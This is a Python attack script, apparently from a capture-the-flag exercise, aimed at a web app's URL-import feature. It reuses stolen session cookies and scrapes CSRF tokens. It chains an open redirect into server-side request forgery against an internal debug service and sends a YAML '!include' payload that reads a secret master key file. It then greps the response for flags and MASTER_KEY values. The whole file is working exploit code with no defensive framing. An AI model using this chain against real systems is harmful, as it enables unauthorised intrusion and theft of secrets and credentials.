import requests, re, json, urllib.parse, sys
BASE=sys.argv[1] if len(sys.argv)>1 else 'http://15.252.91.100'
st=json.load(open('cn_state.json'))
S=requests.Session(); S.headers.update({'User-Agent':'Mozilla/5.0'})
for k,v in st['cookies'].items(): S.cookies.set(k,v)
def csrf(h):
    m=re.search(r'name="csrfmiddlewaretoken" value="([^"]*)"',h); return m.group(1) if m else None
def imp(url):
    r=S.get(BASE+'/import/url/'); t=csrf(r.text)
    r=S.post(BASE+'/import/url/', data={'csrfmiddlewaretoken':t,'url':url}, headers={'Referer':BASE+'/import/url/'})
    out=[]
    for m in re.finditer(r'(class="alert[^"]*"[\s\S]{0,3000}?</div>|<pre[\s\S]*?</pre>)', r.text):
        seg=re.sub(r'<[^>]+>',' ',m.group(0)); seg=re.sub(r'\s+',' ',seg).strip()
        for a,b in [('&#x27;',"'"),('&quot;','"'),('&amp;','&'),('&lt;','<'),('&gt;','>'),('&#39;',"'")]: seg=seg.replace(a,b)
        if seg and 'Paste' not in seg and 'No remote imports' not in seg: out.append(seg)
    return r.text, out
def via_redirect(internal):
    return imp(BASE+'/redirect/?url='+urllib.parse.quote(internal, safe=''))

path='/opt/cloudnine/source/secrets/master.key'
yaml=f'!include {path}'
raw,out=via_redirect('http://127.0.0.1:9000/debug/parse?config='+urllib.parse.quote(yaml,safe=''))
print('### !include master.key')
for o in out: print('  >', o)
# search whole response for flag{...}
for m in re.finditer(r'flag\{[^}]*\}', raw, re.I):
    print('FLAG FOUND:', m.group(0))
# also try MASTER_KEY line
for m in re.finditer(r'MASTER_KEY[=:][^\s<"]+', raw):
    print('MASTER:', m.group(0))
